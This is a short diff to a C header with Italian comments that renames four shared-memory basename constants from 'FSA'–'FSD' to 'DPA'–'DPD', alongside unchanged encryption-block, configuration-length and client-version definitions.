@@ -91,10 +91,10 @@ extern BOOL is_demo_version;
 #define BLOCK_LEN 16 // Lunghezza di un blocco di cifratura (per AES)
 #define CLEAR_CONF_LEN 8 // Numero di byte in chiaro all'inizio del file di configurazione
 
-#define SHARE_MEMORY_READ_BASENAME "FSA"
-#define SHARE_MEMORY_WRITE_BASENAME "FSB"
-#define SHARE_MEMORY_ASP_COMMAND_BASENAME "FSC"
-#define SHARE_MEMORY_ASP_DATA_BASENAME "FSD"
+#define SHARE_MEMORY_READ_BASENAME "DPA"
+#define SHARE_MEMORY_WRITE_BASENAME "DPB"
+#define SHARE_MEMORY_ASP_COMMAND_BASENAME "DPC"
+#define SHARE_MEMORY_ASP_DATA_BASENAME "DPD"
 
 // Versione del client 
 #define CLIENT_VERSION "2013031101"
